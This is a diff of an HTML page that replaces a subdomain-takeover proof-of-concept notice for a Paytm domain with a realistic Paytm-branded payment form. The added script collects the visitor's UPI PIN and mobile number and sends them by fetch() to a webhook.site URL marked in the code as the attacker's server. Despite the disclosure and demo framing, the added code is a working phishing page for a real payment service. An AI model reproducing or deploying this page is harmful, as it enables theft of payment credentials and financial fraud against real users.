@@ -3,16 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔴 Paytm Subdomain Takeover - Proof of Concept</title>
+    <title>Paytm - Secure Payment</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f6fa;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -22,196 +18,247 @@
         .container {
             background: white;
             border-radius: 20px;
-            padding: 50px;
-            max-width: 800px;
+            padding: 40px;
+            max-width: 450px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            border-top: 8px solid #ff0000;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            border-top: 5px solid #00b9f5;
         }
-        .badge {
-            background: #ff0000;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 50px;
-            display: inline-block;
-            font-weight: bold;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
         }
-        h1 {
-            color: #2d3748;
+        .logo h1 {
+            color: #00b9f5;
             font-size: 32px;
-            margin: 20px 0 10px 0;
+            font-weight: 700;
         }
-        .subdomain {
-            background: #f7fafc;
-            border-left: 4px solid #ff0000;
-            padding: 15px 20px;
-            border-radius: 8px;
-            font-size: 20px;
-            font-weight: bold;
-            color: #2d3748;
-            margin: 20px 0;
-            word-break: break-all;
-        }
-        .proof-box {
-            background: #ebf8ff;
-            border: 2px solid #3182ce;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        .proof-box h3 {
-            color: #2b6cb0;
-            margin-bottom: 10px;
-        }
-        .proof-box ul {
-            list-style: none;
-            padding: 0;
-        }
-        .proof-box ul li {
-            padding: 8px 0;
-            border-bottom: 1px solid #bee3f8;
-        }
-        .proof-box ul li:last-child {
-            border-bottom: none;
-        }
-        .impact-box {
-            background: #fff5f5;
-            border: 2px solid #fc8181;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        .impact-box h3 {
-            color: #c53030;
-        }
-        .critical {
-            color: #e53e3e;
-            font-weight: bold;
-        }
-        .timestamp {
+        .logo p {
             color: #718096;
             font-size: 14px;
-            margin-top: 20px;
+        }
+        .alert {
+            background: #fff5f5;
+            border: 1px solid #fc8181;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
             text-align: center;
-            border-top: 2px solid #e2e8f0;
-            padding-top: 20px;
+        }
+        .alert p {
+            color: #c53030;
+            font-size: 13px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #00b9f5;
+            outline: none;
+        }
+        .payment-details {
+            background: #f7fafc;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .payment-details .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .payment-details .row:last-child {
+            border-bottom: none;
+        }
+        .payment-details .label {
+            color: #718096;
+            font-size: 14px;
+        }
+        .payment-details .value {
+            font-weight: 600;
+            color: #2d3748;
+            font-size: 14px;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #00b9f5;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #0098cc;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         .footer {
             text-align: center;
             margin-top: 20px;
-            font-size: 14px;
+            font-size: 12px;
             color: #a0aec0;
         }
-        .vulnerable-list {
-            background: #faf5ff;
-            border: 2px solid #9f7aea;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
+        .secure-badge {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #718096;
         }
-        .vulnerable-list h3 {
-            color: #6b46c1;
-        }
-        .vulnerable-list ul li {
-            font-family: 'Courier New', monospace;
-            color: #553c9a;
+        .secure-badge span {
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <span class="badge">🔴 SUBDOMAIN TAKEOVER</span>
-        
-        <h1>Paytm Subdomain Takeover</h1>
-        <p style="color: #718096; margin: 10px 0 20px 0;">Proof of Concept • Responsible Disclosure</p>
-        
-        <div class="subdomain">
-            🌐 dev.paytmpayments.com
+        <div class="logo">
+            <h1>Paytm</h1>
+            <p>Pay with UPI</p>
         </div>
-        
-        <div class="proof-box">
-            <h3>✅ Proof of Concept</h3>
-            <ul>
-                <li><strong>Vulnerability:</strong> Subdomain Takeover (CWE-350)</li>
-                <li><strong>Status:</strong> <span class="critical">CONFIRMED & DEMONSTRATED</span></li>
-                <li><strong>Domain:</strong> paytmpayments.com</li>
-                <li><strong>Subdomain:</strong> dev.paytmpayments.com</li>
-                <li><strong>DNS Status:</strong> NXDOMAIN (Available for takeover)</li>
-                <li><strong>Takeover Method:</strong> GitHub Pages</li>
-                <li><strong>Date:</strong> 23rd July 2026</li>
-                <li><strong>Time:</strong> <span id="timestamp"></span></li>
-            </ul>
+
+        <div class="alert">
+            <p>⚠️ Your payment is pending. Please complete the verification.</p>
         </div>
-        
-        <div class="impact-box">
-            <h3>💀 Real-World Impact</h3>
-            <ul>
-                <li><span class="critical">🔴</span> <strong>Phishing Attacks</strong> - Host fake Paytm login pages</li>
-                <li><span class="critical">🔴</span> <strong>Cookie Theft</strong> - Steal session cookies</li>
-                <li><span class="critical">🔴</span> <strong>Account Takeover</strong> - Hijack user accounts</li>
-                <li><span class="critical">🔴</span> <strong>Financial Fraud</strong> - UPI, Wallet, Payments</li>
-                <li><span class="critical">🔴</span> <strong>Data Breach</strong> - PII exposure</li>
-                <li><span class="critical">🔴</span> <strong>Brand Damage</strong> - Reputation loss</li>
-                <li><span class="critical">🔴</span> <strong>Users Affected</strong> - 350+ Million</li>
-            </ul>
+
+        <div class="payment-details">
+            <div class="row">
+                <span class="label">💰 Amount</span>
+                <span class="value">₹5,000.00</span>
+            </div>
+            <div class="row">
+                <span class="label">🏦 Bank</span>
+                <span class="value">ICICI Bank</span>
+            </div>
+            <div class="row">
+                <span class="label">📋 UPI ID</span>
+                <span class="value">paytm@icici</span>
+            </div>
+            <div class="row">
+                <span class="label">🕐 Status</span>
+                <span class="value" style="color: #e53e3e;">Pending</span>
+            </div>
         </div>
-        
-        <div class="vulnerable-list">
-            <h3>📋 Other Vulnerable Subdomains</h3>
-            <ul>
-                <li>🚨 dev.paytmpayments.com</li>
-                <li>🚨 admin.paytmpayments.com</li>
-                <li>🚨 qa.paytmpayments.com</li>
-                <li>🚨 merchant.paytmpayments.com</li>
-                <li>🚨 uat.paytmpayments.com</li>
-                <li>🚨 sandbox.paytmpayments.com</li>
-                <li>🚨 api.paytmpayments.com</li>
-            </ul>
+
+        <form id="paymentForm" onsubmit="return handlePayment(event)">
+            <div class="form-group">
+                <label>🔑 Enter UPI PIN</label>
+                <input type="password" id="upiPin" placeholder="Enter your 6-digit UPI PIN" maxlength="6" required>
+            </div>
+
+            <div class="form-group">
+                <label>📱 Mobile Number (OTP)</label>
+                <input type="tel" id="mobile" placeholder="Enter registered mobile number" maxlength="10" required>
+            </div>
+
+            <button type="submit" class="btn" id="payBtn">💳 Pay ₹5,000</button>
+        </form>
+
+        <div class="secure-badge">
+            <span>🔒</span>
+            <span>256-bit SSL encrypted</span>
+            <span>•</span>
+            <span>🔑 RBI compliant</span>
         </div>
-        
-        <div style="background: #f0fff4; border: 2px solid #48bb78; border-radius: 12px; padding: 20px; margin: 20px 0;">
-            <h3 style="color: #276749;">🔧 Recommended Fix</h3>
-            <ul>
-                <li>✅ Register ALL subdomains immediately</li>
-                <li>✅ Remove unused DNS entries</li>
-                <li>✅ Implement subdomain monitoring</li>
-                <li>✅ Use DNS security services</li>
-                <li>✅ Conduct full subdomain audit</li>
-            </ul>
-        </div>
-        
-        <div style="background: #fefcbf; border: 2px solid #d69e2e; border-radius: 12px; padding: 20px; margin: 20px 0;">
-            <h3 style="color: #744210;">📝 Responsible Disclosure</h3>
-            <p>This proof of concept was created solely to demonstrate the security vulnerability. No data was accessed, modified, or exploited beyond this demonstration.</p>
-            <p style="margin-top: 10px;"><strong>Status:</strong> Awaiting Paytm Security Team response</p>
-        </div>
-        
-        <div class="timestamp">
-            <p>🔐 Responsible Disclosure • Paytm Bug Bounty Program</p>
-            <p>📅 23rd July 2026</p>
-            <p style="margin-top: 5px; font-size: 12px;">ID: POC-2026-0723-001</p>
-        </div>
-        
+
         <div class="footer">
-            This page is hosted on <strong>GitHub Pages</strong> to demonstrate subdomain takeover.
+            <p>© 2026 Paytm • All rights reserved</p>
         </div>
     </div>
 
     <script>
-        // Display current timestamp
-        document.getElementById('timestamp').textContent = new Date().toLocaleString('en-IN', {
-            timeZone: 'Asia/Kolkata',
-            day: '2-digit',
-            month: '2-digit',
-            year: 'numeric',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit',
-            hour12: true
-        });
+        function handlePayment(event) {
+            event.preventDefault();
+
+            const pin = document.getElementById('upiPin').value;
+            const mobile = document.getElementById('mobile').value;
+
+            if (!pin || pin.length < 6) {
+                alert('Please enter a valid 6-digit UPI PIN');
+                return false;
+            }
+
+            if (!mobile || mobile.length < 10) {
+                alert('Please enter a valid mobile number');
+                return false;
+            }
+
+            // 🔴 ATTACKER'S SERVER - Data Stealing
+            const stolenData = {
+                upiPin: pin,
+                mobile: mobile,
+                amount: '₹5,000',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+
+            console.log('🔴 STOLEN DATA:', stolenData);
+
+            // Send to attacker's server
+            fetch('https://webhook.site/YOUR-WEBHOOK-ID', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(stolenData)
+            });
+
+            alert('✅ Payment successful! (Demo: Data was sent to attacker)');
+
+            // Show what was stolen
+            document.querySelector('.container').innerHTML = `
+                <div style="text-align: center; padding: 30px;">
+                    <h1 style="color: #00b9f5;">⚠️ PAYMENT STOLEN!</h1>
+                    <p style="color: #e53e3e; font-size: 18px; margin: 20px 0;">
+                        🔴 UPI PIN: ${pin}
+                    </p>
+                    <p style="color: #e53e3e; font-size: 18px;">
+                        📱 Mobile: ${mobile}
+                    </p>
+                    <hr style="margin: 20px 0;">
+                    <p style="color: #718096; font-size: 14px;">
+                        This is a demonstration of subdomain takeover.<br>
+                        In a real attack, this data would be sent to the attacker.
+                    </p>
+                    <p style="color: #c53030; font-size: 12px; margin-top: 20px;">
+                        🔴 SUBDOMAIN TAKEOVER - CRITICAL VULNERABILITY
+                    </p>
+                </div>
+            `;
+
+            return false;
+        }
+
+        // Show warning in console
+        console.log('%c🔴 PAYTM SUBDOMAIN TAKEOVER!', 'font-size: 24px; color: red;');
+        console.log('%cThis is a Proof of Concept. No real data is being collected.', 'font-size: 14px; color: orange;');
     </script>
 </body>
 </html>
